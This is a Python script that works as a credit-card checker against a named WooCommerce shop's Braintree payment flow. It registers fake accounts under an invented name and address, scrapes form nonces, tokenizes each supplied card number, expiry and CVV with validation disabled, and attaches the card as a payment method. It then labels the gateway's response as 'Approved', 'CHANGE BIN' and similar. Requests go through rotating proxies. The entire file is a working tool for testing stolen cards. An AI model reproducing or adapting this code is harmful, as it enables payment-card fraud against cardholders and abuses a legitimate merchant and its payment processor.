
import json
from bs4 import BeautifulSoup
import ssl
import certifi
import aiohttp
import asyncio
import random
import base64
import platform

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

async def BraintreeWoo(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        cvv      = splitter[3] 
        try:
            #---------------------------------REQUEST NUMERO 1---------------   ---------------#
            #---------------------------------REQUEST NUMERO 1---------------   ---------------#        
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
            })
            async with session.get(url='https://www.tanologist.com/my-account/', proxy=str(proxyrand), timeout=22) as resp:
                try :          
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    noncewoo = soup.find_all("input", {"name": "woocommerce-register-nonce"})[0]["value"]
                except (UnboundLocalError):
    
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
                except (IndexError):
    
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
                except (KeyError):
    
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 2---------------   ---------------#
            #---------------------------------REQUEST NUMERO 2---------------   ---------------#    
            data = {
                'email': f'YoelGonzales{random.randint(1000,9999)}{random.randint(1000,9999)}@gmail.com',
                'password':'tvJc9DG87qSiLwx',
                'woocommerce-register-nonce': noncewoo,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            async with session.post('https://www.tanologist.com/my-account', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :          
                    response = await resp.text()
                except (UnboundLocalError):
    
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
                except (TypeError):
    
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
                except (KeyError):
    
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 4---------------   ---------------#
            #---------------------------------REQUEST NUMERO 4---------------   ---------------#
            async with session.get('https://www.tanologist.com/my-account/edit-address/billing', proxy=str(proxyrand), timeout=22) as resp:
                try :
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    addressnonce = soup.find("input", {"name": "woocommerce-edit-address-nonce"})["value"]    
                except (UnboundLocalError):
    
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except (TypeError):
    
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except (KeyError):
    
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 3---------------   ---------------#
            #---------------------------------REQUEST NUMERO 3---------------   ---------------#
            data = {
                'billing_first_name': 'Yoel',
                'billing_last_name': 'Gonzales',
                'billing_company': '',
                'billing_country': 'US',
                'billing_address_1': '1282 street',
                'billing_address_2': '1900',
                'billing_city': 'Miami',
                'billing_state': 'FL',
                'billing_postcode': '33130',
                'billing_phone': f'7875654{random.randint(100,999)}',
                'billing_email': f'YoelGonzales{random.randint(1000,9999)}{random.randint(1000,9999)}@gmail.com',
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': addressnonce,
                '_wp_http_referer': '/my-account/edit-address/billing',
                'action': 'edit_address',
            }
            async with session.post('https://www.tanologist.com/my-account/edit-address/billing', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :
                        response = await resp.text()
                except (UnboundLocalError):
    
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
                except (TypeError):
    
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
                except (KeyError):
    
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            async with session.get('https://www.tanologist.com/my-account/add-payment-method/', proxy=str(proxyrand), timeout=22) as resp:
                try :
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    noncewoo2 = soup.find("input", {"name": "woocommerce-add-payment-method-nonce"})["value"]    
                    lines = response.split("\n")
                    for i in lines:
                        if "window.wc_braintree_credit_card_payment_form_handler" in i:
                            sucio = i
                            sucio = sucio.replace('			window.wc_braintree_credit_card_payment_form_handler = new WC_Braintree_Credit_Card_Payment_Form_Handler( ',"").replace(' );window.jQuery( document.body ).trigger( "update_checkout" );		}',"")
                            bearer = json.loads(sucio)
                            bearer = bearer['client_token_nonce']
                except (UnboundLocalError):
    
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
                except (TypeError):
    
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
                except (KeyError):
    
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 6---------------   ---------------#
            #---------------------------------REQUEST NUMERO 6---------------   ---------------#

            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': bearer,
            }
            async with session.post('https://www.tanologist.com/wp-admin/admin-ajax.php', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :
                    response = await resp.json()
                    bearer = json.loads(base64.b64decode(response['data']))
                    bearer = bearer['authorizationFingerprint']
                except (UnboundLocalError):
    
                    return 'An unexpected error occurred in request 06. It was not generated correctly. ♻️'
                except (TypeError):
    
                    return 'An unexpected error occurred in request 06. It was not generated correctly. ♻️'
                except (KeyError):
    
                    return 'An unexpected error occurred in request 06. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 7---------------   ---------------#
            #---------------------------------REQUEST NUMERO 7---------------   ---------------#

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {bearer}',
                'Braintree-Version': '2018-05-10',
                'Origin': 'https://assets.braintreegateway.com',
                'Connection': 'keep-alive',
                'Referer': 'https://assets.braintreegateway.com/',
            }

            data = {

                "clientSdkMetadata":{
                    "source":"client",
                    "integration":"custom",
                    "sessionId":"80d75624-440f-4366-b67d-71c43f6ecd8a"
                },
                "query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
                "variables":{
                    "input":{
                        "creditCard":{
                            "number": ccnum,
                            "expirationMonth": mes,
                            "expirationYear": ano,
                            "cvv": cvv
                        },
                        "options":{
                            "validate":False
                        }
                    }
                },
                "operationName":"TokenizeCreditCard"

            }
            async with session.post('https://payments.braintree-api.com/graphql', headers=headers, proxy=str(proxyrand),json=data, timeout=12) as resp:
                try :        
                    token = await resp.json()
                    token = token['data']['tokenizeCreditCard']['token'] 
                except (UnboundLocalError):
    
                    return 'An unexpected error occurred in request 07. It was not generated correctly. ♻️'
                except (TypeError):
    
                    return 'An unexpected error occurred in request 07. It was not generated correctly. ♻️'
                except (KeyError):
    
                    return 'An unexpected error occurred in request 07. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            data = {
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': 'master-card',
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                'wc_braintree_credit_card_payment_nonce': token,
                'wc_braintree_device_data': '{"correlation_id":"fdcf445f1c6deab4e549968e74bacd4e"}',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': noncewoo2,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
            async with session.post('https://www.tanologist.com/my-account/add-payment-method/', data=data, proxy=str(proxyrand), timeout=22) as resp:
                try :
                    response = await resp.text()
                    lines = response.split("\n")
                except (UnboundLocalError):
    
                    return 'An unexpected error occurred in request 08. It was not generated correctly. ♻️'
                except (TypeError):
    
                    return 'An unexpected error occurred in request 08. It was not generated correctly. ♻️'
                except (KeyError):
    
                    return 'An unexpected error occurred in request 08. It was not generated correctly. ♻️'
            #---------------------------------REQUEST CHECKS---------------   ---------------#
            #---------------------------------REQUEST CHECKS---------------   ---------------#
            if int(response.find('New payment method added')) > 0 :
                return "Approved", "1000 Approved"
            elif int(response.find('Status code 1000: Approved')) > 0 :
                lines = response.split("\n")
                for i in lines:
                    if 'Status code ' in i:
                        sucio = i
                        Message = sucio.replace(f'Status code ',"").replace(" </li>","").replace(": "," ")
                return "Approved", Message
            elif int(response.find('Status code 2001: Insufficient Funds')) > 0 :
                lines = response.split("\n")
                for i in lines:
                    if 'Status code ' in i:
                        sucio = i
                        Message = sucio.replace(f'Status code ',"").replace(" </li>","").replace(": "," ")
                return "Approved", Message
            elif (int(response.find('Status code cvv:')) > 0):
                return "Approved", "Gateway Rejected: cvv"
            elif (int(response.find('Status code avs: Gateway Rejected: avs')) > 0):
                return "Approved", "Gateway Rejected: avs"
            elif (int(response.find('Status code avs_and_cvv:')) > 0):
                return "Approved", "Gateway Rejected: avs and cvv"
            elif int(response.find('Status code 2010: Card Issuer Declined CVV')) > 0 :
                lines = response.split("\n")
                for i in lines:
                    if 'Status code ' in i:
                        sucio = i
                        Message = sucio.replace(f'Status code ',"").replace(" </li>","").replace(": "," ")
                return "Approved", Message
            elif int(response.find('Status code risk_threshold:')) > 0 :
                return "Gateway Rejected: CHANGE BIN"
            elif int(response.find('Gateway Rejected: fraud')) > 0 :
                return "Gateway Rejected: FRAUD"
            elif int(response.find('Processor Network Unavailable')) > 0 :
                return "Processor Network Unavailable - Try Again"
            elif int(response.find('Duplicate card exists in the vault.')) > 0 :
                return "This card is already registered"
            elif int(response.find('Status code')) > 0 :
                lines = response.split("\n")
                for i in lines:
                    if 'Status code ' in i:
                        sucio = i
                        Message = sucio.replace(f'Status code ',"").replace(" </li>","").replace(": "," ")
                return Message
            else :

                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        finally :
            await session.close()